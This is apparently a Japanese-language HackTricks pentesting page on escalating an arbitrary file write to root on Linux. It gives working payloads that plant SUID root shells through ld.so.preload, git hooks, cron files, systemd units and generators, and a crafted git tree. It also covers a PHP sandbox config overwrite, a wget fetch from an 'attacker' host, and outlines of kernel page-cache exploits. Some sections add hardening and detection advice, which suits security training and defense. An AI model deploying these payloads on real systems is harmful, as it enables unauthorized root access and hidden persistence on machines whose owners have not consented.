# Root への任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` は、dynamic linker が他の shared objects より先にロードする shared objects のシステム全体のリストです。Secure-execution mode では preloading に追加の制限が適用されるため、`/tmp/pe.so` のような library path は universal な SUID-binary technique ではありません。\
これを作成または変更できる場合、このファイルをロードするプロセスは、他の shared objects より先に指定された library をロードするため、そのプロセスの context で code execution が可能になります。<sup>[[12]](#references)</sup>

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** は、commit や merge 操作など、repository 内のイベントで実行される executable script です。**privileged script または user** がこれらの操作を実行し、attacker が **`.git` folder に write** できる場合、hook を **privilege escalation** に利用できます。<sup>[[13]](#references)</sup>

たとえば、git repo の **`.git/hooks`** に **script を生成** し、新しい commit が作成されるたびに常に実行されるようにできます：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### 特権 Git tree export path traversal

特権を持つ synchronizer は checkout を回避し、攻撃者の影響を受ける repository を `git ls-tree` で列挙し、各 blob を `git cat-file` で読み取り、報告された pathname を staging directory に結合して、自身で書き込むことがあります。`-c safe.directory=*`（Git の異なる owner の repository に対する guard を無効化）と、destination の containment check がない状態を組み合わせると、これは **synchronizer の権限による arbitrary file write** になります。絶対パスの tree-entry name を指定すると、Python の `os.path.join(stage, name)` は `stage` を破棄します。また、`../` を含む relative name は、filesystem が解決する際に外部へ脱出します。アプリケーションは Git に checkout を任せるのではなく raw tree を materialize するため、checkout 時の pathname rejection によって sink が保護されることはありません。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root services、timers、deployment agents、template importers、backup/restore jobs で、次のような code shape を探してください。<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
tree エントリは `<mode> SP <name> NUL <raw object ID>` としてエンコードされます。`git hash-object --literally` オプションは、通常の parsing や `git fsck` が拒否する可能性のある object data を意図的に許可するため、使い捨ての clone で filename が絶対 destination となる tree を構築できます。この例では、cron-file の blob を作成し、craft した tree を commit でラップして、branch をそこへ移動します。ただし、exploit には privileged job が利用する repository を update する permission と、malformed object を受け入れる Git server が必要です。<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening では、repository の取り込みと最終的な filesystem 操作の両方を対象にする必要があります:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` を、service が信頼する必要のある正確な repository に置き換え、可能な場合は root 権限なしで repository 処理を実行します。
- materialization の前に、絶対パス名と `.` または `..` の component を拒否します。結合後に canonicalize し、destination が意図した root 配下に留まっていることを検証します。
- check-then-open による symlink race を避けます。信頼できる directory descriptor を基準に相対パスで open し、Linux では攻撃者が制御する path に対して `RESOLVE_BENEATH` と `RESOLVE_NO_SYMLINKS` を指定した `openat2()` を使用します。
- plumbing output から checkout を再実装するより、隔離された directory で通常の checkout を行うことを優先します。raw-object ingestion が必要な場合は、`receive.fsckObjects=true` などの receive-side validation を有効にし、crafted tree を拒否するために必要な pathname 関連の `receive.fsck.*` findings を無効化または緩和しないでください。

### Cron と Time ファイル

**root が実行する cron 関連ファイルを書き込める**場合、通常は次回の job 実行時に code execution を取得できます。興味深い target には次のものがあります:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが trigger する services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路:

- **新しい root cron job を追加する** `/etc/crontab` または `/etc/cron.d/` 内のファイルに
- **スクリプトを置き換える** `run-parts` によってすでに実行されているものを
- **既存の timer target に backdoor を仕込む** 起動されるスクリプトまたはバイナリを変更して

最小限の cron payload の例:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します。
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を使用してください。<sup>[[15]](#references)</sup>
- 一部のシステムでは、従来の cron の代わりに `systemd` timers を使用しますが、abuse の考え方は同じです。つまり、**後で root が実行するものを変更する**ことです。<sup>[[20]](#references)</sup>

### Service と Socket ファイル

**`systemd` unit ファイル**またはそれらが参照するファイルに書き込み可能な場合、unit を reload および restart することで、あるいは service/Socket activation path が trigger されるまで待つことで、root として code execution を取得できる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

興味深い targets には次のものがあります。

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` で参照される Service scripts/binaries
- root service によって読み込まれる、書き込み可能な `EnvironmentFile=` paths

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
一般的な悪用経路：

- **`ExecStart=` を上書き**：変更可能な root 所有の service unit
- **drop-in override を追加**：悪意のある `ExecStart=` を設定し、最初に古いものをクリアする
- **Backdoor the script/binary**：unit がすでに参照している script/binary
- **socket-activated service を Hijack**：socket が接続を受信したときに起動する、対応する `.service` ファイルを変更する

悪意のある override の例：
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的なアクティベーションフロー:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
自分で service を再起動できなくても、socket-activated unit を編集できる場合は、**クライアント接続を待つだけ**で、backdoored service を root として実行させられる可能性があります。<sup>[[17]](#references)</sup>

### systemd generator ディレクトリ

**System generators** は、unit files を読み込む前に system manager によって起動される executable で、boot 時と configuration reload 時の両方で実行されます。したがって、system-generator directory（または既存の executable generator）への write access は、監査で `*.service` と `*.timer` files だけを確認する場合に見落としやすい、直接的な root-code-execution primitive です。<sup>[[35]](#references)[[36]](#references)</sup>

通常の検索順序は `/run/systemd/system-generators/`、`/etc/systemd/system-generators/`、`/usr/local/lib/systemd/system-generators/`、`/usr/lib/systemd/system-generators/` です（ディストリビューションによっては、`/usr` merge により `/lib/systemd/system-generators/` が公開されています）。先にある directory に同名の executable が存在する場合、後にあるものが shadow されます。これらの **input executable directories** を、generators が生成した transient unit output を格納する `/run/systemd/generator`、`/run/systemd/generator.early`、`/run/systemd/generator.late` と混同しないでください。<sup>[[35]](#references)</sup>

簡単な確認方法:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
新しく作成したジェネレーターには、実行ビットを設定する必要があります。write primitive がバイトのみを制御し、モードを制御できない場合は、すでに実行可能なジェネレーターを対象にします。通常、そのファイルをその場で切り詰めてもメタデータは保持されます。ディレクトリ自体が書き込み可能な場合は、新しいエントリを作成して実行可能に設定します。<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
`systemctl daemon-reload` を **system** manager に対して実行するには適切な認証が必要ですが、実行するとすべての system generator が再実行されます。それ以外の場合は、特権を持つ reload、パッケージ操作、または reboot を待つ必要があります。`~/.config/systemd/user-generators/` などの user-generator ディレクトリは user manager の下で実行されるため、それだけでは root を取得できません。<sup>[[35]](#references)</sup>

Hardening と hunting では、最終的な mode bits だけでなく、すべてのパスコンポーネントと ACL を確認し、generator の baseline hash と package ownership を記録してください。また、すべての system-generator input directory における作成、rename、content、または permission の変更を alert してください。one-shot generator は実行後に自身を削除できるため、write の monitoring は重要です。一方、`/run/systemd/generator*` 配下の generated unit tree は次回の reload 時に再構築されます。<sup>[[35]](#references)[[36]](#references)</sup>

### privileged PHP sandbox で使用される restrictive な `php.ini` を overwrite する

一部の custom daemon は、**restricted `php.ini`**（たとえば `disable_functions=exec,system,...`）を指定して `php` を実行することで、user-supplied PHP を検証します。sandbox 内の code に **any write primitive**（`file_put_contents` など）が残っており、daemon が使用する **exact な `php.ini` path** に到達できる場合、その config を **overwrite** して restrictions を解除し、その後、elevated privileges で実行される second payload を送信できます。<sup>[[2]](#references)</sup>

Typical flow:

1. 最初の payload で sandbox config を overwrite する。
2. dangerous functions が再び有効になった状態で、second payload により code を実行する。

Minimal example（daemon が使用する path に置き換えてください）:
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
デーモンが root として実行される場合（または root 所有のパスで検証する場合）、2 回目の実行で root コンテキストが得られます。これは、sandbox 化された runtime が引き続きファイルを書き込める場合の、**config overwrite による privilege escalation**に相当します。

### binfmt_misc

`binfmt_misc` は `/proc/sys/fs/binfmt_misc` 配下に登録情報を公開します。各登録はファイルタイプのパターンと interpreter を関連付けます。権限への影響は、誰が登録情報を変更できるか、また後からどのプロセスが一致するファイルを実行するかによって異なるため、これらの要件を確認してから privilege-escalation path として扱ってください。<sup>[[21]](#references)</sup>

### schema handler を overwrite する（http: や https: など）

Desktop environment は MIME association と desktop entry を使用して URI scheme のアプリケーションを選択します。攻撃者が、該当する per-user configuration と desktop-entry directory に書き込める場合、それらの scheme を自身が制御する launcher にリダイレクトできます。`$HOME/.config/mimeapps.list` ファイルを変更して、HTTP および HTTPS URL handler を悪意のあるファイル（例: `x-scheme-handler/http=evil.desktop` および `x-scheme-handler/https=evil.desktop`）に指定すると、ユーザーのクリックによってその desktop entry を呼び出せます。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Rootがユーザー書き込み可能なscript/binaryを実行する場合

特権ワークフローが `/bin/sh /home/username/.../script` のようなコマンド（または非特権ユーザーが所有するディレクトリ内のバイナリ）を実行する場合、それを乗っ取ることができます。<sup>[[1]](#references)</sup>

- **実行を検出する:** pspyでプロセスを監視し、rootがユーザー制御のパスを呼び出していることを検出します。<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能性を確認:** 対象ファイルとそのディレクトリの両方が、ユーザー自身の所有であり、書き込み可能であることを確認します。
- **対象をHijack:** 元のbinary/scriptをバックアップし、SUID shellを作成するpayload（またはその他のroot操作）を配置してから、権限を復元します。
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged actionをトリガーする**（例: helperをspawnするUIボタンを押す）。rootがhijackされたpathを再実行したら、`./rootshell -p`でescalated shellを取得する。

### privileged binaryのpage-cache-only file modification

一部のkernel bugは、**disk上のfile**を変更しません。代わりに、readable fileの**page cache copy**だけを変更できます。**setuid**またはその他の方法で**rootが実行する**binaryを対象にできる場合、次回の実行時にmemory上のattacker-controlled bytesが実行され、disk上のfile hashが変更されていなくてもprivilege escalationが可能です。<sup>[[3]](#references)[[4]](#references)</sup>

これは、**runtime-only file write primitive**として考えると分かりやすいでしょう。<sup>[[3]](#references)</sup>

- **Disk stays clean**: inodeとdisk上のbytesは変更されない
- **Memory is dirty**: cached pageを読み取りまたは実行するprocessは、attackerが変更したcontentを取得する
- **Effect is temporary**: rebootまたはcache eviction後に変更は消える

このprimitiveは、classicな**arbitrary file write**と、Dirty COW / Dirty Pipeなどの古い**page-cache abuse** bugの中間に位置します。<sup>[[3]](#references)</sup>

- Dirty COWはraceに依存していた
- Dirty Pipeにはwrite-positionの制約があった
- vulnerable pathがcached file-backed pagesへの直接writeを提供する場合、page-cache-only primitiveの方が信頼性が高い

#### Generic privesc flow

1. **file-backed page cache pages**にwriteできるkernel primitiveを取得する
2. それを**readable privileged binary**または別のroot-executed fileに対して使用する
3. pageがcacheからevictされる**前に**executionをトリガーする
4. disk上のfileが未変更に見えるまま、rootとしてcode executionを取得する

一般的なhigh-value target:

- **setuid-root** binary
- **root service**がlaunchするhelper
- **host kernel/page cacheを共有するcontainer**から頻繁に実行されるbinary

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431)は、このクラスの良い例です。vulnerable pathはLinux crypto userspace API（`AF_ALG` / `algif_aead`）にありました。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`は、readable fileのpage-cache pagesへのreferencesをcrypto TX scatterlistに移動できる
- in-placeの`algif_aead` decrypt pathは、sourceとdestinationのbufferを再利用した
- その後`authencesn`がdestination tag regionにwriteした
- そのregionがまだspliced file-backed pagesを参照していた場合、writeは**target fileのpage cache**に反映された

したがって、興味深いtechniqueはCVE自体ではなく、次のpatternです。

- **file-backed cache pagesをkernel subsystemに渡す**
- subsystemにそれらを**writable outputとして扱わせる**
- memory上で小さく制御されたoverwriteをトリガーする

公開PoCは、繰り返し**4-byte writes**を使用してmemory上の`/usr/bin/su`にpatchを適用し、その後実行しました。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503)は、同じ**page-cache-only write-to-root** patternの別variantを示しています。ただし今回は、sinkは`AF_ALG`ではなく**IPsec ESP decrypt**です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要なtechniqueは、**metadata-laundering step**です。

- `splice()`が**read-only file-backed page-cache page**をESP-in-UDP packetに配置する
- 元のDirtyFrag mitigationは、そのskbに`SKBFL_SHARED_FRAG`を付け、`esp_input()`がdecrypt前に**copyする**ようにしていた
- netfilter `TEE`が`nf_dup_ipv4()` -> `__pskb_copy_fclone()`を通じてpacketをduplicateする
- cloneは**同じphysical page-cache reference**を保持するが、`SKBFL_SHARED_FRAG`を失う
- その後`esp_input()`はcloneをsafeなものとして扱い、file-backed page上でin-placeの`cbc(aes)` decryptを実行する

したがって、reviewerへのlessonはCVEよりも広範です。operationが先にcopy必須かどうかの判断を**skb/page metadata**に依存している場合、backing pageを保持しながらmetadataを削除する**clone/copy path**によって、write primitiveが気付かれないまま再び有効化される可能性があります。

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`を実行して、**private network namespace内で`CAP_NET_ADMIN`**を取得する
2. loopbackをupにし、`mangle/OUTPUT`に**netfilter `TEE` rule**をinstallする
3. `NETLINK_XFRM`経由で**XFRM ESP transport SA**をinstallする
4. 各target 4-byte wordをSAの`seq_hi` fieldにencodeする（DirtyFragのword-selection trick）
5. spliced ESP-in-UDP packetをsendし、**TEE clone**が`esp_input()`に到達してin-place decryptするようにする
6. page-cache copy of `/usr/bin/su`または別のprivileged executableにattacker-controlled codeが含まれるまで繰り返す

Operationally、impactは`AF_ALG` exampleと同じです。disk上のfileはcleanなままですが、`execve()`が**mutated page-cache bytes**を使用してrootを取得します。<sup>[[8]](#references)[[9]](#references)</sup>

このvariantで役立つexposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
ここでの短期的な attack-surface reduction も path-specific です。`48f6a5356a33` を含む kernel に upgrade すると clone path が修正され、`xt_TEE` の autoload を block すると **flag-laundering step** が除去され、`esp4` / `esp6` を block すると **decrypt sink** が除去されます。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure and hunting

このクラスの bug が疑われる場合、disk integrity checks だけに頼らないでください。次の点も verify してください。
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
以下の設定値は、loadable interfaceとkernelに組み込まれたinterfaceを区別します。crypto build rulesでは、`CONFIG_CRYPTO_USER_API_AEAD`を`algif_aead`に対応付けています。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`はmoduleとしてload/unload可能
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfaceはkernelに組み込まれる
- setuid binariesは、page-cache-only patchだけでlocal footholdをrootに昇格できる可能性があるため、優れたtargetです

#### `algif_aead` pathのattack surface削減

vulnerable interfaceがloadable moduleによって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルにコンパイルされている場合、一部の開示では、以下によって init path がブロックされたと報告されています：<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
この種の緩和策は、他の kernel LPE に対しても覚えておく価値があります。exploit が特定の optional interface に依存している場合、その interface を無効化または blacklist 化することで、kernel の完全な upgrade がまだ利用できない場合でも、exploit path を未然に断つことができます。<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – user-writable な PaperCut directory 内で root 実行される script の hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place 操作に revert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) の分析と exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を保持 (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux の以前の mitigation: spliced UDP packets に `SKBFL_SHARED_FRAG` を設定 (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
